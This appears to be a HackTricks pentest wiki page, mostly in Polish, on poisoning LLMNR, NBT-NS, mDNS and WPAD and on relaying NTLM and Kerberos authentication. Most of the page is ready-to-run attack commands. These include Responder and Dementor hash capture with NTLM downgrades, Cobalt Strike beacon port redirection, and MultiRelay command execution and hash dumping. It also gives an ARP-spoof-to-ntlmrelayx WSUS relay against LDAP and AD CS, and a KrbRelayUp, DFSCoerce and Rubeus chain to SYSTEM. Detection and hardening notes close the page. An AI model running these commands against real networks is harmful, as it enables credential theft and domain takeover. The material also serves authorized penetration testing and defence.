# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Protokoły sieciowe

### Protokoły lokalnego rozwiązywania nazw hostów

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft i inne systemy operacyjne używają LLMNR i NBT-NS do rozwiązywania nazw lokalnych, gdy DNS zawiedzie. Podobnie systemy Apple i Linux używają mDNS.
- Protokoły te są podatne na przechwycenie i spoofing z powodu ich nieuwierzytelnionej, rozgłoszeniowej natury działającej przez UDP.
- [Responder](https://github.com/lgandx/Responder) i [Dementor](https://github.com/MatrixEditor/Dementor) mogą być użyte do podszywania się pod usługi poprzez wysyłanie sfałszowanych odpowiedzi do hostów zapytujących te protokoły.
- Dalsze informacje o podszywaniu się pod usługi za pomocą Responder są dostępne [tutaj](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD pozwala przeglądarkom automatycznie odnaleźć ustawienia proxy.
- Odkrywanie odbywa się przez DHCP, DNS lub, jeśli DNS zawiedzie, za pomocą LLMNR i NBT-NS.
- Responder może zautomatyzować ataki WPAD, kierując klientów do złośliwych serwerów WPAD.

### Responder/Dementor for Protocol Poisoning

- **Responder** to narzędzie używane do zatruwania zapytań LLMNR, NBT-NS i mDNS, odpowiadając selektywnie w zależności od typu zapytania, głównie celując w usługi SMB.
- Jest preinstalowany w Kali Linux i konfigurowalny w `/etc/responder/Responder.conf`.
- Responder wyświetla przechwycone hashe na ekranie i zapisuje je w katalogu `/usr/share/responder/logs`.
- Wspiera zarówno IPv4 jak i IPv6.
- Wersja Responder dla Windows jest dostępna [tutaj](https://github.com/lgandx/Responder-Windows).

- **Dementor** rozszerza tematykę zatruwania multicast i dodatkowo działa jako rogue service provider (w tym obsługa CUPS RCE).
- Ogólna struktura jest podobna do **Responder** z bardziej granularną konfiguracją. (domyślny plik znajduje się tutaj: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Zgodność między **Dementor** i **Responder** znajduje się tutaj: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Wprowadzenie i dokumentacja: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Naprawia problemy z przechwytywaniem wprowadzone przez Responder dla niektórych protokołów

#### Uruchamianie Responder

- Aby uruchomić Responder z ustawieniami domyślnymi: `responder -I <Interface>`
- Dla bardziej agresywnego sondowania (z możliwymi skutkami ubocznymi): `responder -I <Interface> -P -r -v`
- Techniki przechwytywania wyzwań/odpowiedzi NTLMv1 ułatwiające łamanie: `responder -I <Interface> --lm --disable-ess`
- Podszywanie się pod WPAD można aktywować poleceniem: `responder -I <Interface> --wpad`
- Żądania NetBIOS można rozwiązać na adres IP atakującego i skonfigurować proxy uwierzytelniające: `responder.py -I <interface> -Pv`

#### Uruchamianie Dementor

- Przy zastosowaniu ustawień domyślnych: `Dementor -I <interface>`
- Z ustawieniami domyślnymi w trybie analizy: `Dementor -I <interface> -A`
- Automatyczne obniżenie sesji NTLM (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Uruchomienie bieżącej sesji z niestandardową konfiguracją: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing odpowiedzi DHCP może trwale zatruć informacje routingu ofiary, oferując bardziej subtelną alternatywę dla ARP poisoning.
- Wymaga precyzyjnej wiedzy o konfiguracji sieci docelowej.
- Uruchomienie ataku: `./Responder.py -I eth0 -Pdv`
- Ta metoda może skutecznie przechwycić hashe NTLMv1/2, ale wymaga ostrożnego postępowania, aby uniknąć zakłóceń sieci.

### Przechwytywanie poświadczeń za pomocą Responder/Dementor

- Responder/Dementor będzie podszywać się pod usługi wykorzystując wymienione protokoły, przechwytując poświadczenia (zwykle NTLMv2 Challenge/Response), gdy użytkownik próbuje uwierzytelnić się wobec podszytych usług.
- Można próbować obniżyć wersję do NetNTLMv1 lub wyłączyć ESS, aby ułatwić łamanie poświadczeń.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Należy pamiętać, że stosowanie tych technik powinno odbywać się legalnie i etycznie, z odpowiednią autoryzacją oraz bez zakłócania sieci lub uzyskiwania nieautoryzowanego dostępu.

## Inveigh

Inveigh to narzędzie dla penetration testerów i red teamerów, zaprojektowane dla systemów Windows. Oferuje funkcjonalności podobne do Responder, wykonując spoofing i ataki man-in-the-middle. Narzędzie ewoluowało ze skryptu PowerShell do binarki C#, a główne wersje to [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) oraz [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero). Szczegółowe parametry i instrukcje znajdują się w [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh można obsługiwać przez PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Lub uruchomione jako plik binarny C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Atak ten wykorzystuje sesje uwierzytelniania SMB do uzyskania dostępu do maszyny docelowej, przyznając system shell w przypadku powodzenia. Kluczowe wymagania wstępne to:

- Użytkownik uwierzytelniający musi mieć dostęp Local Admin na hoście, na który przekazywane jest uwierzytelnienie.
- SMB signing powinno być wyłączone.

#### Przekierowywanie i tunelowanie portu 445

W sytuacjach, gdy bezpośrednie wprowadzenie do sieci nie jest możliwe, ruch na porcie 445 musi być przekierowany i tunelowany. Narzędzia takie jak [**PortBender**](https://github.com/praetorian-inc/PortBender) pomagają przekierować ruch z portu 445 na inny port, co jest niezbędne, gdy dostęp Local Admin umożliwia ładowanie sterownika.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Inne narzędzia do NTLM Relay Attack

- **Metasploit**: Skonfiguruj z proxies oraz danymi lokalnego i zdalnego hosta.
- **smbrelayx**: Skrypt Python do przekazywania sesji SMB oraz wykonywania komend lub wdrażania backdoors.
- **MultiRelay**: Narzędzie z pakietu Responder do relay konkretnych users lub wszystkich users, wykonywania commands lub dump hashes.

Każde narzędzie można skonfigurować do działania przez SOCKS proxy, co umożliwia ataki nawet przy pośrednim dostępie do sieci.

### MultiRelay Operation

MultiRelay jest uruchamiany z katalogu _**/usr/share/responder/tools**_, celując w konkretne IPs lub users.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Te narzędzia i techniki tworzą kompleksowy zestaw do przeprowadzania NTLM Relay ataków w różnych środowiskach sieciowych.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

Klienci WSUS uwierzytelniają się do swojego serwera aktualizacji przy użyciu NTLM przez HTTP (8530) lub HTTPS (8531). Gdy HTTP jest włączone, okresowe check-iny klienta można wymusić lub przechwycić na lokalnym segmencie i zrelayować przy pomocy ntlmrelayx do punktów końcowych LDAP/LDAPS/SMB lub AD CS HTTP (ESC8) bez łamania żadnych hashy. Miesza się to z normalnym ruchem aktualizacji i często skutkuje uwierzytelnieniami kont maszynowych (HOST$).

What to look for
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Rozpoznanie
- Unauthenticated
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).
- Authenticated
- Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Position for MITM (same L2) so a client resolves the WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirect port 8530 to your relay listener (optional, convenient):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Start ntlmrelayx with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Trigger a client check-in or wait for schedule. From a client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Use the authenticated SOCKS sessions (if -socks) or direct relay results for post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).

HTTPS constraint (8531)
- Passive interception of WSUS over HTTPS is ineffective unless clients trust your certificate. Without a trusted cert or other TLS break, the NTLM handshake can’t be harvested/relayed from WSUS HTTPS traffic.

Notes
- WSUS was announced deprecated but remains widely deployed; HTTP (8530) is still common in many environments.
- Useful helpers: wsusniff.py (observe HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.
- Impacket restored HTTP listener support for ntlmrelayx in PR #2034 (originally added in PR #913).

### Force NTLM Logins

W Windows możesz być w stanie zmusić niektóre uprzywilejowane konta do uwierzytelnienia się do dowolnych maszyn. Przeczytaj następującą stronę, aby dowiedzieć się jak:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** kradnie **AP-REQ ticket** z jednej usługi i ponownie używa go przeciwko drugiej usłudze, która dzieli ten sam **computer-account key** (ponieważ oba SPN są ustawione na tym samym koncie maszyny `$`). To działa nawet jeśli klasy usług SPN różnią się (np. `CIFS/` → `LDAP/`), ponieważ *klucz*, który odszyfrowuje ticket, to NT hash maszyny, a nie sam ciąg SPN i ciąg SPN nie jest częścią podpisu.

W przeciwieństwie do NTLM relay, skok jest ograniczony do *tej samej hosta*, ale jeżeli zaatakujesz protokół, który pozwala na zapis do LDAP, możesz łańcuchować do **Resource-Based Constrained Delegation (RBCD)** lub **AD CS enrollment** i wybić **NT AUTHORITY\SYSTEM** jednym ciosem.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Proves the user to the KDC | untouched |
| **Service ticket / TGS-REQ ↔ REP** | Bound to one **SPN**; encrypted with the SPN owner’s key | interchangeable if SPNs share account |
| **AP-REQ** | Client sends `TGS` to the service | **what we steal & replay** |

* Tickets are encrypted with the **password-derived key of the account that owns the SPN**.
* The **Authenticator** inside the AP-REQ has a 5-minute timestamp; replay inside that window is valid until the service cache sees a duplicate.
* Windows rarely checks if the SPN string in the ticket matches the service you hit, so a ticket for `CIFS/HOST` normally decrypts fine on `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Uruchom nasłuch relaya**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` opakowuje **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** w jednym pliku binarnym.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce powoduje, że DC wysyła do nas bilet Kerberos `CIFS/DC01`.

- 3.4 **Relay the AP-REQ**

KrbRelay wyodrębnia GSS blob z SMB, opakowuje go w LDAP bind i przekazuje do `ldap://DC01` — uwierzytelnienie powiodło się, ponieważ **ten sam klucz** go odszyfrowuje.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Teraz posiadasz **NT AUTHORITY\SYSTEM**.


### **Więcej ścieżek wartych poznania**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Fałszywy serwer wysyła a **GSS-ID payload** z dowolnym SPN; klient tworzy AP-REQ bezpośrednio do ciebie | Działa nawet między subnetami; domyślnie używa poświadczeń maszyny |
| **DCOM / MSRPC** | Złośliwy resolver OXID zmusza klienta do uwierzytelnienia wobec dowolnego SPN i portu | Czysty *lokalny* priv-esc; omija zaporę |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Omija zabezpieczenia podpisywania LDAP |
| **Shadow Credentials** | Zapisz `msDS-KeyCredentialLink`, potem PKINIT z podrobioną parą kluczy | Nie trzeba dodawać konta komputera |

### **Rozwiązywanie problemów**

| Błąd | Znaczenie | Rozwiązanie |
|------|----------|-------------|
| `KRB_AP_ERR_MODIFIED` | Klucz ticketu ≠ klucz celu | Zły host/SPN |
| `KRB_AP_ERR_SKEW` | Przesunięcie czasu > 5 min | Synchronizuj czas lub użyj `w32tm` |
| LDAP bind fails | Wymagane podpisywanie | Użyj ścieżki AD CS lub wyłącz podpisywanie |
| Event 4649 spam | Usługa widziała duplikat Authenticatora | Zablokuj lub spróbuj wyścigać oryginalny pakiet |


### **Wykrywanie**

* Nagły wzrost **Event 4769** dla `CIFS/`, `HTTP/`, `LDAP/` z tego samego źródła w ciągu kilku sekund.
* **Event 4649** na serwisie wskazuje wykryte powtórzenie (replay).
* Logowanie Kerberos z **127.0.0.1** (relay do lokalnego SCM) jest bardzo podejrzane — zmapuj przy pomocy reguły Sigma w dokumentacji KrbRelayUp.
* Monitoruj zmiany atrybutów `msDS-AllowedToActOnBehalfOfOtherIdentity` lub `msDS-KeyCredentialLink`.

## **Wzmocnienie**

1. **Enforce LDAP & SMB signing + EPA** na każdym serwerze.
2. **Split SPNs** tak, aby HTTP nie było na tym samym koncie co CIFS/LDAP.
3. Załatuj wektory przymusu (PetitPotam KB5005413, DFS, AuthIP).
4. Ustaw **`ms-DS-MachineAccountQuota = 0`**, aby zatrzymać nieautoryzowane dołączanie komputerów.
5. Generuj alert dla **Event 4649** i nieoczekiwanych logowań Kerberos z loopback.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
